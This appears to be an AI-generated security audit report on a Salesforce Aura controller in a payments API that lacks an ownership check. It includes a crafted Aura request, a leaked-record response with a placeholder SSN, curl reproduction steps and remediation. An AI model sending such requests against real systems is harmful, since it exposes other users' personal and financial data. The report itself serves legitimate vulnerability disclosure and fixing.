# Security Analysis Report
**System:** PayBridge Transaction API (Fintech / Payments Gateway) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0020 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform / Pattern 9.2 | Salesforce SOQL record-level access bypass — `TaskController.getTask` without ownership check exposes cross-user payment transaction records |

---

## Finding 1 — SOQL Record-Level Access Bypass in Payment Platform Aura Controller (CRITICAL)

### Summary
The `TaskController` Apex class on PayBridge Transaction API (`5a83f71f.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Task records. Per §5.0 Pattern 9.2, the `getTask` action issues a SOQL query without an ownership predicate (`AND OwnerId = :UserInfo.getUserId()`), enabling direct record-level access to any task by ID. An attacker with a valid Salesforce session substitutes `taskId: "001F71F"` to retrieve another user's payment transaction task, including their SSN and confidential payment notes.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.TaskController.getTask`
**Affected endpoint:** `POST https://5a83f71f.lightning.force.com/aura`

### Evidence from HAR

**Request (attacker with valid session):**
```
POST https://5a83f71f.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00D5A83F71F!AR5a83f71f...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D5A83F71F!AR5a83f71f...

message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"001F71F","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "001F71F",
        "Name": "Victim Task Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-10-1011"
      }]
    },
    "error": []
  }]
}
```

**`aura.token`:** `undefined` — no server-side Aura session validation.

The response exposes `SensitiveData__c: "SSN: 000-10-1011"` and payment transaction notes for `OwnerId: "005VICTIM"`. In a payments gateway, Task records can contain transaction workflow data, compliance review notes, and customer financial identity.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 Apex code | `without sharing` | Class declaration | OWD=Private bypassed |
| §4.0 SOQL | No OwnerId predicate | Missing ownership check | Root cause |
| §5.0 Pattern 9.2 | Vulnerability | SOQL record-level access bypass | Classification |
| HAR descriptor | `c.TaskController.getTask` | Aura action | Vulnerable entry point |
| HAR params | `taskId` | `001F71F` | Victim record ID |
| HAR params | `aura.token` | `undefined` | No Aura token validation |
| HAR response | `OwnerId` | `005VICTIM` | Victim user — cross-user access confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-10-1011` | Payment PII leaked |
| HAR response | `InternalNotes__c` | `CONFIDENTIAL: internal review notes` | Transaction notes exposed |

### Steps to Reproduce

**Step 1 — Obtain valid Salesforce session:**
```bash
SF_TOKEN="00D5A83F71F!AR5a83f71f..."
```

**Step 2 — Call Aura controller with victim's taskId (VULNERABLE):**
```bash
curl -s -X POST "https://5a83f71f.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SF_TOKEN" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"001F71F","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -m json.tool
# Expected VULNERABLE output: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-10-1011
```

**Step 3 — Secure baseline (expected after fix):**
```bash
# Returns: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Privileges"}]}]}
```

### Remediation

1. **Add `with sharing` to Apex class:** `public with sharing class TaskController {`
2. **Add ownership predicate:** `WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId()`
3. **Add `WITH SECURITY_ENFORCED`** to enforce field-level security.
4. **Validate `aura.token`:** Reject requests with undefined/invalid Aura token.
5. **Server-defined field allowlist:** Remove client-supplied `fields` parameter; restrict fields to minimum required for the function.
6. **Fintech/PCI compliance:** Payment transaction records are PCI DSS scope — access to cardholder data must be logged, encrypted, and access-controlled per PCI DSS requirements.
